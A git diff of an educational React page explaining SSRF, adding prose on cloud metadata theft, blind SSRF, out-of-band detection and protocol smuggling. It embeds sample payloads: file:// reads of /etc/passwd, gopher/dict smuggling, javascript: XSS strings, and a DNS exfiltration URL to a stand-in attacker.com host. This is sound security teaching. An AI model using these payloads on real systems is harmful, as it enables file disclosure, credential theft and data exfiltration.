@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import LearnPageLayout from "../components/LearnPageLayout";
 import QuizSection, { QuizQuestion } from "../components/QuizSection";
 import {
@@ -6,8 +6,6 @@ import {
   Typography,
   Container,
   Paper,
-  Tabs,
-  Tab,
   Alert,
   AlertTitle,
   Accordion,
@@ -33,6 +31,10 @@ import {
   Tooltip,
   alpha,
   useTheme,
+  useMediaQuery,
+  Drawer,
+  Fab,
+  LinearProgress,
 } from "@mui/material";
 import { Link, useNavigate } from "react-router-dom";
 import ArrowBackIcon from "@mui/icons-material/ArrowBack";
@@ -56,22 +58,12 @@ import DnsIcon from "@mui/icons-material/Dns";
 import HttpIcon from "@mui/icons-material/Http";
 import LanguageIcon from "@mui/icons-material/Language";
 import LinkIcon from "@mui/icons-material/Link";
-
-// TabPanel component
-interface TabPanelProps {
-  children?: React.ReactNode;
-  index: number;
-  value: number;
-}
-
-function TabPanel(props: TabPanelProps) {
-  const { children, value, index, ...other } = props;
-  return (
-    <div role="tabpanel" hidden={value !== index} {...other}>
-      {value === index && <Box sx={{ py: 3 }}>{children}</Box>}
-    </div>
-  );
-}
+import ListAltIcon from "@mui/icons-material/ListAlt";
+import CloseIcon from "@mui/icons-material/Close";
+import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
+import SchoolIcon from "@mui/icons-material/School";
+import SpeedIcon from "@mui/icons-material/Speed";
+import VpnLockIcon from "@mui/icons-material/VpnLock";
 
 // Code block component
 interface CodeBlockProps {
@@ -230,6 +222,19 @@ const QUIZ_QUESTION_COUNT = 10;
 
 const selectRandomQuestions = (questions: QuizQuestion[], count: number) =>
   [...questions].sort(() => Math.random() - 0.5).slice(0, count);
+
+// Section Navigation Items
+const sectionNavItems = [
+  { id: "intro", label: "Introduction", icon: <CloudIcon /> },
+  { id: "attack-types", label: "Attack Types", icon: <BugReportIcon /> },
+  { id: "discovery", label: "Discovery", icon: <SearchIcon /> },
+  { id: "exploitation", label: "Exploitation", icon: <WarningIcon /> },
+  { id: "cloud-attacks", label: "Cloud Attacks", icon: <StorageIcon /> },
+  { id: "prevention", label: "Prevention", icon: <ShieldIcon /> },
+  { id: "tools", label: "Tools", icon: <BuildIcon /> },
+  { id: "code-examples", label: "Code Examples", icon: <CodeIcon /> },
+  { id: "quiz", label: "Knowledge Check", icon: <SchoolIcon /> },
+];
 
 const quizQuestions: QuizQuestion[] = [
   {
@@ -851,125 +856,363 @@ const quizQuestions: QuizQuestion[] = [
 
 
 const SSRFGuidePage: React.FC = () => {
-  const [tabValue, setTabValue] = useState(0);
   const navigate = useNavigate();
   const theme = useTheme();
+  const isMobile = useMediaQuery(theme.breakpoints.down("md"));
+  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
+  const [activeSection, setActiveSection] = useState("intro");
   const [quizPool] = useState<QuizQuestion[]>(() =>
     selectRandomQuestions(quizQuestions, QUIZ_QUESTION_COUNT)
   );
 
-  const handleTabChange = (_: React.SyntheticEvent, newValue: number) => {
-    setTabValue(newValue);
+  const scrollToSection = (id: string) => {
+    const el = document.getElementById(id);
+    if (el) {
+      el.scrollIntoView({ behavior: "smooth", block: "start" });
+      setActiveSection(id);
+      setNavDrawerOpen(false);
+    }
   };
 
-  const pageContext = `This page covers Server-Side Request Forgery (SSRF) vulnerabilities, explaining how attackers trick servers into making requests to unintended locations. Topics include SSRF attack types (basic, blind, full-response), common targets like cloud metadata services (AWS, GCP, Azure), filter bypass techniques (IP encoding, DNS rebinding, protocol smuggling), exploitation methods, and prevention strategies including URL validation, network segmentation, and cloud-specific hardening.`;
+  useEffect(() => {
+    const handleScroll = () => {
+      const sections = sectionNavItems.map((s) => s.id);
+      for (const id of sections) {
+        const el = document.getElementById(id);
+        if (el) {
+          const rect = el.getBoundingClientRect();
+          if (rect.top <= 150 && rect.bottom > 150) {
+            setActiveSection(id);
+            break;
+          }
+        }
+      }
+    };
+    window.addEventListener("scroll", handleScroll, { passive: true });
+    return () => window.removeEventListener("scroll", handleScroll);
+  }, []);
+
+  const pageContext = `This page covers Server-Side Request Forgery (SSRF) vulnerabilities, explaining how attackers trick servers into making requests to unintended locations. Topics include SSRF attack types (basic, blind, full-response), common targets like cloud metadata services (AWS, GCP, Azure), filter bypass techniques (IP encoding, DNS rebinding, protocol smuggling), exploitation methods, and prevention strategies including URL validation, network segmentation, and cloud-specific hardening. Current section: ${activeSection}.`;
+
+  // Sidebar navigation component
+  const sidebarNav = (
+    <Paper
+      sx={{
+        p: 2,
+        position: "sticky",
+        top: 80,
+        maxHeight: "calc(100vh - 100px)",
+        overflowY: "auto",
+        bgcolor: "#12121a",
+        border: `1px solid ${alpha(ACCENT_COLOR, 0.2)}`,
+        borderRadius: 2,
+      }}
+    >
+      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: ACCENT_COLOR, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+        <ListAltIcon fontSize="small" />
+        Contents
+      </Typography>
+      <Box sx={{ mb: 2 }}>
+        <LinearProgress
+          variant="determinate"
+          value={((sectionNavItems.findIndex((s) => s.id === activeSection) + 1) / sectionNavItems.length) * 100}
+          sx={{
+            height: 4,
+            borderRadius: 2,
+            bgcolor: alpha(ACCENT_COLOR, 0.1),
+            "& .MuiLinearProgress-bar": { bgcolor: ACCENT_COLOR },
+          }}
+        />
+        <Typography variant="caption" sx={{ color: "grey.500", mt: 0.5, display: "block" }}>
+          {sectionNavItems.findIndex((s) => s.id === activeSection) + 1} / {sectionNavItems.length} sections
+        </Typography>
+      </Box>
+      <List dense disablePadding>
+        {sectionNavItems.map((item) => (
+          <ListItem
+            key={item.id}
+            component="button"
+            onClick={() => scrollToSection(item.id)}
+            sx={{
+              borderRadius: 1,
+              mb: 0.5,
+              bgcolor: activeSection === item.id ? alpha(ACCENT_COLOR, 0.15) : "transparent",
+              borderLeft: activeSection === item.id ? `3px solid ${ACCENT_COLOR}` : "3px solid transparent",
+              cursor: "pointer",
+              border: "none",
+              width: "100%",
+              textAlign: "left",
+              "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.08) },
+            }}
+          >
+            <ListItemIcon sx={{ minWidth: 32, color: activeSection === item.id ? ACCENT_COLOR : "grey.500" }}>
+              {item.icon}
+            </ListItemIcon>
+            <ListItemText
+              primary={item.label}
+              primaryTypographyProps={{
+                variant: "body2",
+                fontWeight: activeSection === item.id ? 600 : 400,
+                color: activeSection === item.id ? "#e0e0e0" : "grey.400",
+              }}
+            />
+          </ListItem>
+        ))}
+      </List>
+    </Paper>
+  );
 
   return (
     <LearnPageLayout pageTitle="Server-Side Request Forgery (SSRF)" pageContext={pageContext}>
-    <Container maxWidth="xl" sx={{ py: 4 }}>
-      {/* Back Button */}
-      <Chip
-        component={Link}
-        to="/learn"
-        icon={<ArrowBackIcon />}
-        label="Back to Learning Hub"
-        clickable
-        variant="outlined"
-        sx={{ borderRadius: 2, mb: 3 }}
-      />
+    <Box sx={{ minHeight: "100vh", bgcolor: "#0a0a0f", py: 4 }}>
+      <Container maxWidth="xl">
+        <Grid container spacing={3}>
+          {/* Sidebar Navigation - Desktop */}
+          {!isMobile && (
+            <Grid item md={2.5} sx={{ display: { xs: "none", md: "block" } }}>
+              {sidebarNav}
+            </Grid>
+          )}
 
-      {/* Header */}
-      <Box sx={{ mb: 4 }}>
-        <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
-          <CloudIcon sx={{ fontSize: 40, color: "primary.main" }} />
-          <Box>
-            <Typography variant="h4" fontWeight="bold">
-              Server-Side Request Forgery (SSRF)
-            </Typography>
-            <Typography variant="subtitle1" color="text.secondary">
-              Understanding and preventing SSRF vulnerabilities
-            </Typography>
-          </Box>
-        </Box>
-      </Box>
+          {/* Main Content */}
+          <Grid item xs={12} md={9.5}>
+            {/* Header */}
+            <Box id="intro" sx={{ mb: 4 }}>
+              <Chip
+                component={Link}
+                to="/learn"
+                icon={<ArrowBackIcon />}
+                label="Back to Learning Hub"
+                clickable
+                variant="outlined"
+                sx={{ borderRadius: 2, mb: 3 }}
+              />
+              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
+                <CloudIcon sx={{ fontSize: 40, color: ACCENT_COLOR }} />
+                <Typography
+                  variant="h3"
+                  sx={{
+                    fontWeight: 700,
+                    background: `linear-gradient(135deg, ${ACCENT_COLOR} 0%, #06b6d4 100%)`,
+                    backgroundClip: "text",
+                    WebkitBackgroundClip: "text",
+                    color: "transparent",
+                  }}
+                >
+                  Server-Side Request Forgery (SSRF)
+                </Typography>
+              </Box>
+              <Typography variant="h6" sx={{ color: "grey.400", mb: 2 }}>
+                Understanding and preventing SSRF vulnerabilities
+              </Typography>
+              <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
+                <Chip icon={<CloudIcon />} label="Cloud Metadata" size="small" />
+                <Chip icon={<StorageIcon />} label="Internal Services" size="small" />
+                <Chip icon={<SecurityIcon />} label="OWASP Top 10" size="small" />
+                <Chip icon={<BugReportIcon />} label="Filter Bypass" size="small" />
+              </Box>
+            </Box>
 
       {/* Introduction Section */}
-      <Paper sx={{ p: 4, mb: 4, borderRadius: 2 }}>
-        <Typography variant="h5" gutterBottom color="primary" fontWeight="bold">
+      <Paper
+        sx={{
+          p: 4,
+          mb: 4,
+          borderRadius: 3,
+          background: `linear-gradient(135deg, ${alpha(ACCENT_COLOR, 0.15)} 0%, ${alpha("#06b6d4", 0.1)} 50%, ${alpha(ACCENT_COLOR, 0.05)} 100%)`,
+          border: `1px solid ${alpha(ACCENT_COLOR, 0.3)}`,
+        }}
+      >
+        <Typography variant="h5" gutterBottom sx={{ fontWeight: 700, color: "#e0e0e0" }}>
           What is Server-Side Request Forgery?
         </Typography>
         
-        <Typography paragraph sx={{ fontSize: "1.1rem", lineHeight: 1.8 }}>
+        <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, color: "grey.300" }}>
           <strong>Server-Side Request Forgery (SSRF)</strong> is a web security vulnerability that allows an attacker 
           to make a server perform requests to unintended locations. Think of it like tricking a librarian into 
           fetching books from a restricted section - you can't go there yourself, but you can convince someone 
           with access to go for you.
         </Typography>
 
-        <Typography paragraph sx={{ fontSize: "1.1rem", lineHeight: 1.8 }}>
+        <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, color: "grey.300" }}>
           <strong>How does it work?</strong> Many web applications fetch data from URLs - for example, a profile 
           picture URL, a webhook endpoint, or a document to convert. If the application doesn't validate these 
           URLs properly, an attacker can provide a URL pointing to internal systems that shouldn't be accessible 
           from the outside.
         </Typography>
 
-        <Typography paragraph sx={{ fontSize: "1.1rem", lineHeight: 1.8 }}>
-          <strong>Why is it dangerous?</strong> The server making the request typically has access to internal 
-          networks, cloud metadata services, and other resources that external attackers cannot reach directly. 
+        <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, color: "grey.300" }}>
+          <strong>Why is it dangerous?</strong> The server making the request typically has access to internal
+          networks, cloud metadata services, and other resources that external attackers cannot reach directly.
           SSRF essentially turns a web server into a proxy for attacking internal infrastructure.
         </Typography>
 
+        {/* The Evolution of SSRF */}
+        <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#06b6d4", 0.03), borderRadius: 2, border: `1px solid ${alpha("#06b6d4", 0.2)}` }}>
+          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>
+            The Evolution of SSRF: From Niche Bug to Critical Threat
+          </Typography>
+          <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+            SSRF wasn't always considered a critical vulnerability. In the early 2000s, it was seen as a minor security curiosity—an interesting way
+            to make servers fetch unexpected content, but not particularly dangerous. The vulnerability landscape changed dramatically with three
+            major shifts in technology: the rise of cloud computing, the adoption of microservices architectures, and the proliferation of APIs.
+          </Typography>
+          <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+            Cloud providers like AWS, Azure, and Google Cloud Platform introduced metadata services accessible at predictable IP addresses
+            (169.254.169.254 for most providers). These services were designed to give instances information about themselves—instance IDs, IAM
+            roles, temporary credentials, and more. The problem? If an attacker could leverage SSRF to make a cloud instance request its own
+            metadata service, they could steal credentials with full permissions to the cloud account. This transformed SSRF from a theoretical
+            issue into a critical vulnerability capable of compromising entire infrastructures.
+          </Typography>
+          <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+            The 2019 Capital One breach exemplified this threat. An attacker exploited an SSRF vulnerability in a web application firewall to
+            access AWS metadata credentials, ultimately exfiltrating over 100 million customer records. The breach cost Capital One $80 million
+            in fines and settlements, and elevated SSRF to the OWASP Top 10 in 2021. Today, SSRF is one of the most sought-after vulnerabilities
+            in bug bounty programs, with payouts regularly exceeding $30,000 for critical findings.
+          </Typography>
+        </Paper>
+
+        {/* Understanding the Attack Surface */}
+        <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
+          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
+            Understanding the SSRF Attack Surface
+          </Typography>
+          <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+            The attack surface for SSRF is surprisingly large in modern applications. Any feature that fetches external content is potentially
+            vulnerable. This includes obvious candidates like webhook URLs, PDF generators that fetch remote content, image proxies, and URL
+            preview features (like the rich link previews you see on social media). But it also includes less obvious attack vectors: XML
+            parsers with external entity support, SVG file processors, document converters, feed aggregators, and even some authentication flows
+            (OAuth callback URL validation, SAML assertion consumer URLs).
+          </Typography>
+          <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+            Modern development frameworks and libraries make it trivially easy to fetch URLs—a single line of code in most languages. Python's
+            <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px", margin: "0 4px"}}>requests.get(url)</code>,
+            Node.js's
+            <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px", margin: "0 4px"}}>fetch(url)</code>,
+            PHP's
+            <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px", margin: "0 4px"}}>file_get_contents()</code>—all
+            make the same mistake when given an unvalidated URL parameter. The ease of implementation combined with the lack of security
+            awareness means SSRF vulnerabilities are widespread.
+          </Typography>
+          <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+            The challenge for defenders is that many SSRF-vulnerable features are legitimate business requirements. A SaaS application
+            might genuinely need to fetch customer-provided webhooks, or a document service might need to import files from URLs. The
+            solution isn't to eliminate these features but to implement them securely—something that requires defense in depth, including
+            URL validation, network segmentation, egress filtering, and careful response handling.
+          </Typography>
+        </Paper>
+
         <Grid container spacing={2} sx={{ mb: 3 }}>
           {[
-            { icon: <StorageIcon />, title: "Access Internal Services", desc: "Reach databases, APIs, and admin panels behind firewalls" },
-            { icon: <SecurityIcon />, title: "Steal Cloud Credentials", desc: "Access metadata services like AWS, GCP, Azure" },
-            { icon: <BugReportIcon />, title: "Port Scanning", desc: "Map internal network infrastructure" },
-            { icon: <PublicIcon />, title: "Bypass Access Controls", desc: "Access resources restricted by IP allowlists" },
+            { icon: <StorageIcon />, title: "Access Internal Services", desc: "Reach databases, APIs, and admin panels behind firewalls", color: "#ef4444" },
+            { icon: <SecurityIcon />, title: "Steal Cloud Credentials", desc: "Access metadata services like AWS, GCP, Azure", color: "#f59e0b" },
+            { icon: <BugReportIcon />, title: "Port Scanning", desc: "Map internal network infrastructure", color: "#22c55e" },
+            { icon: <PublicIcon />, title: "Bypass Access Controls", desc: "Access resources restricted by IP allowlists", color: "#06b6d4" },
           ].map((item) => (
             <Grid item xs={12} sm={6} md={3} key={item.title}>
-              <Card variant="outlined" sx={{ height: "100%" }}>
+              <Card
+                sx={{
+                  height: "100%",
+                  bgcolor: alpha(item.color, 0.1),
+                  border: `1px solid ${alpha(item.color, 0.3)}`,
+                  borderRadius: 2,
+                }}
+              >
                 <CardContent>
-                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1, color: "error.main" }}>
+                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1, color: item.color }}>
                     {item.icon}
-                    <Typography variant="subtitle2" fontWeight="bold">{item.title}</Typography>
+                    <Typography variant="subtitle2" fontWeight="bold" sx={{ color: "#e0e0e0" }}>{item.title}</Typography>
                   </Box>
-                  <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
+                  <Typography variant="body2" sx={{ color: "grey.400" }}>{item.desc}</Typography>
                 </CardContent>
               </Card>
             </Grid>
           ))}
         </Grid>
 
-        <Alert severity="error" sx={{ mt: 2 }}>
-          <AlertTitle>OWASP Top 10 - A10:2021</AlertTitle>
-          SSRF was added to the OWASP Top 10 in 2021, reflecting its increasing prevalence and impact, 
-          especially in cloud environments where metadata services are common attack targets.
+        <Alert severity="error" sx={{ bgcolor: alpha("#ef4444", 0.1), border: `1px solid ${alpha("#ef4444", 0.3)}` }}>
+          <AlertTitle sx={{ color: "#e0e0e0" }}>OWASP Top 10 - A10:2021</AlertTitle>
+          <Typography sx={{ color: "grey.300" }}>
+            SSRF was added to the OWASP Top 10 in 2021, reflecting its increasing prevalence and impact, 
+            especially in cloud environments where metadata services are common attack targets.
+          </Typography>
         </Alert>
       </Paper>
 
-      {/* Tabs */}
-      <Paper sx={{ borderRadius: 2 }}>
-        <Tabs
-          value={tabValue}
-          onChange={handleTabChange}
-          variant="scrollable"
-          scrollButtons="auto"
-          sx={{ borderBottom: 1, borderColor: "divider", px: 2 }}
+      {/* Section: Attack Types */}
+      <Box id="attack-types" sx={{ mb: 4, scrollMarginTop: "80px" }}>
+        <Paper
+          sx={{
+            p: 4,
+            borderRadius: 3,
+            bgcolor: "#0f1024",
+            border: `1px solid ${alpha("#ef4444", 0.3)}`,
+          }}
         >
-          <Tab icon={<BugReportIcon />} label="Attack Types" />
-          <Tab icon={<SearchIcon />} label="Discovery" />
-          <Tab icon={<WarningIcon />} label="Exploitation" />
-          <Tab icon={<CloudIcon />} label="Cloud Attacks" />
-          <Tab icon={<ShieldIcon />} label="Prevention" />
-          <Tab icon={<BuildIcon />} label="Tools" />
-          <Tab icon={<CodeIcon />} label="Code Examples" />
-        </Tabs>
+          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
+            <BugReportIcon sx={{ color: "#ef4444" }} />
+            Types of SSRF Attacks
+          </Typography>
 
-        {/* Tab 0: Attack Types */}
-        <TabPanel value={tabValue} index={0}>
-          <Typography variant="h5" gutterBottom>Types of SSRF Attacks</Typography>
+          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2, border: `1px solid ${alpha("#ef4444", 0.2)}` }}>
+            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
+              The Two Flavors of SSRF: Basic vs Blind
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              SSRF vulnerabilities come in two fundamental varieties, each requiring different exploitation techniques. <strong>Basic (Full-Response) SSRF</strong> is
+              the easier variant—the attacker can see the full HTTP response from the server-side request, including headers, body content, and error messages.
+              This makes exploitation straightforward: point the vulnerable application at an internal service, and the application dutifully returns the response
+              to you. This is how the Capital One breach occurred—the attacker could read AWS metadata responses directly through the vulnerable application.
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              <strong>Blind SSRF</strong> is significantly harder to detect and exploit but no less dangerous. The application makes the server-side request but
+              doesn't return the response to the attacker—you might only see a generic success/failure message or no output at all. This is common in webhook
+              implementations where the application validates the URL but doesn't show you what it received. Blind SSRF requires out-of-band (OOB) techniques:
+              you must host a server you control and check logs for incoming connections, use DNS exfiltration, or rely on timing attacks. Tools like Burp
+              Collaborator and interactsh.com were specifically created to detect blind SSRF by providing callback URLs that log all interactions.
+            </Typography>
+            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              The severity difference is subtle: while basic SSRF provides immediate feedback making reconnaissance trivial, blind SSRF can still be weaponized
+              for devastating attacks. Even without seeing responses, an attacker can use blind SSRF to trigger state changes in internal services (delete
+              resources, modify configs), scan internal networks by observing timing differences, or exfiltrate data through DNS queries. The 2019 blind SSRF
+              vulnerability in Microsoft Exchange (CVE-2019-0686) allowed attackers to relay NTLM authentication credentials despite never seeing HTTP responses.
+            </Typography>
+          </Paper>
 
-          <TableContainer component={Paper} sx={{ mb: 3 }}>
+          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#06b6d4", 0.03), borderRadius: 2, border: `1px solid ${alpha("#06b6d4", 0.2)}` }}>
+            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>
+              Protocol Smuggling: Beyond HTTP
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              While most developers think of SSRF as an HTTP problem, the vulnerability becomes exponentially more dangerous when the backend library supports
+              alternative protocols. Python's <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>urllib</code> supports
+              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>file://</code>,{" "}
+              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>ftp://</code>, and{" "}
+              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>gopher://</code> by default. PHP's{" "}
+              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>file_get_contents()</code> and{" "}
+              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>curl</code> have similar multi-protocol capabilities.
+              This transforms a seemingly simple web vulnerability into a file disclosure and network protocol manipulation bug.
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              The <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>file://</code> protocol allows reading arbitrary
+              local files: <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>file:///etc/passwd</code> or{" "}
+              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>file:///C:/Windows/win.ini</code>. The{" "}
+              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>dict://</code> protocol was designed for dictionary
+              lookups but can be abused to communicate with Redis, Memcached, and other text-based protocols. Most dangerous is{" "}
+              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>gopher://</code>—a forgotten protocol from the early
+              internet that allows sending arbitrary bytes over TCP. With gopher, an attacker can construct complete HTTP requests, talk to databases, or
+              interact with internal APIs using any protocol. A gopher URL can even be used to execute Redis commands, modify Memcached keys, or send SMTP emails.
+            </Typography>
+            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              The real-world impact is severe. In 2017, security researcher <strong>Orange Tsai</strong> chained SSRF with protocol smuggling to compromise
+              GitHub's internal infrastructure by sending gopher URLs that interacted with internal services. The vulnerability earned a $10,000 bounty but
+              could have been far more damaging. Protocol smuggling also enables <strong>SSRF-to-XSS</strong> escalation by injecting JavaScript URLs:{" "}
+              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>javascript:alert(document.domain)</code> or{" "}
+              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</code>.
+            </Typography>
+          </Paper>
+
+          <TableContainer component={Paper} sx={{ mb: 3, bgcolor: alpha("#ef4444", 0.05), border: `1px solid ${alpha("#ef4444", 0.2)}` }}>
             <Table>
               <TableHead>
                 <TableRow sx={{ bgcolor: "action.hover" }}>
@@ -1085,18 +1328,85 @@ const SSRFGuidePage: React.FC = () => {
               </TableContainer>
             </AccordionDetails>
           </Accordion>
-        </TabPanel>
+        </Paper>
+      </Box>
 
-        {/* Tab 1: Discovery */}
-        <TabPanel value={tabValue} index={1}>
-          <Typography variant="h5" gutterBottom>Finding SSRF Vulnerabilities</Typography>
+      {/* Section: Discovery */}
+      <Box id="discovery" sx={{ mb: 4, scrollMarginTop: "80px" }}>
+        <Paper
+          sx={{
+            p: 4,
+            borderRadius: 3,
+            bgcolor: "#0f1024",
+            border: `1px solid ${alpha("#f59e0b", 0.3)}`,
+          }}
+        >
+          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
+            <SearchIcon sx={{ color: "#f59e0b" }} />
+            Finding SSRF Vulnerabilities
+          </Typography>
 
-          <Alert severity="info" sx={{ mb: 3 }}>
-            Look for any functionality that fetches external resources: URL imports, webhooks, 
-            PDF generators, image processors, or API integrations.
+          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
+            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
+              The Art of SSRF Discovery: Think Like a Feature, Not a Bug
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              SSRF is fundamentally different from most web vulnerabilities because it's not usually the result of a coding mistake—it's the result of
+              implementing a legitimate feature without considering the security implications. You won't find SSRF by fuzzing for SQL injection or testing
+              for XSS. Instead, you need to think about what the application does: <strong>Does it fetch content from URLs? Does it generate previews?
+              Does it integrate with external services?</strong> Every feature that makes an outbound request is a potential SSRF vector.
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              The most common SSRF vulnerabilities are hiding in plain sight. <strong>Webhook callbacks</strong> are SSRF by design—the application is
+              supposed to make requests to user-provided URLs. The question is whether it validates those URLs properly. <strong>URL preview features</strong>
+              (like Slack's link unfurling or social media card generation) must fetch URLs to generate previews, making them prime SSRF targets.{" "}
+              <strong>PDF generation services</strong> that convert HTML to PDF often allow &lt;img&gt; tags or CSS background images, both of which trigger
+              server-side requests. Even seemingly innocuous features like <strong>Gravatar-style avatar loading</strong> can be vulnerable if users can
+              specify custom avatar URLs.
+            </Typography>
+            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              The discovery methodology is straightforward but requires patience: map all application features, identify every parameter that accepts a URL
+              or path, and systematically test each one. Don't just look for parameters named "url"—look for "callback", "redirect", "link", "src", "feed",
+              "reference", "import", "file", "document", and dozens of other variations. Modern applications often hide SSRF in API integrations: OAuth
+              redirect_uri parameters, SAML assertion consumer service URLs, and OpenID Connect callback URLs are all SSRF attack surfaces if improperly validated.
+            </Typography>
+          </Paper>
+
+          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
+            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
+              Out-of-Band Detection: Your Blind SSRF Superpower
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              When you encounter a potential SSRF endpoint but the application doesn't return the response (blind SSRF), you need out-of-band (OOB) detection
+              techniques. This means using a server you control to receive callbacks and confirm the vulnerability. The gold standard is <strong>Burp
+              Collaborator</strong>, a service that provides unique subdomains and logs all HTTP, DNS, and SMTP interactions. Submit your Burp Collaborator URL
+              to the vulnerable parameter, and if the target server makes a request to it, Burp logs the interaction—proving SSRF even when you can't see
+              the response directly.
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              For bug bounty hunters and researchers without Burp Suite Professional, <strong>interactsh.com</strong> (by ProjectDiscovery) provides an
+              open-source alternative with the same capability. You can also roll your own: set up an HTTP server with{" "}
+              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>python3 -m http.server</code>, expose it with
+              ngrok or a VPS, and monitor access logs. The key insight is that even if the vulnerable application doesn't show you the response, the mere
+              fact that it made a request to your server proves server-side request forgery occurred.
+            </Typography>
+            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              OOB detection is also useful for <strong>DNS exfiltration</strong>. Some SSRF filters block HTTP/HTTPS but allow DNS resolution. If you control
+              a domain (e.g., attacker.com), you can submit URLs like{" "}
+              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>http://SECRET-DATA.attacker.com/</code>. Even if
+              the HTTP request fails, the target server will perform a DNS lookup for "SECRET-DATA.attacker.com", and you'll see the query in your DNS logs.
+              This technique was used in the <strong>2020 SolarWinds breach</strong> to exfiltrate data from compromised networks.
+            </Typography>
+          </Paper>
+
+          <Alert severity="info" sx={{ mb: 3, bgcolor: alpha("#3b82f6", 0.1), border: `1px solid ${alpha("#3b82f6", 0.3)}` }}>
+            <Typography sx={{ color: "grey.300" }}>
+              Look for any functionality that fetches external resources: URL imports, webhooks,
+              PDF generators, image processors, or API integrations.
+            </Typography>
           </Alert>
 
-          <Typography variant="h6" gutterBottom>Common Vulnerable Parameters</Typography>
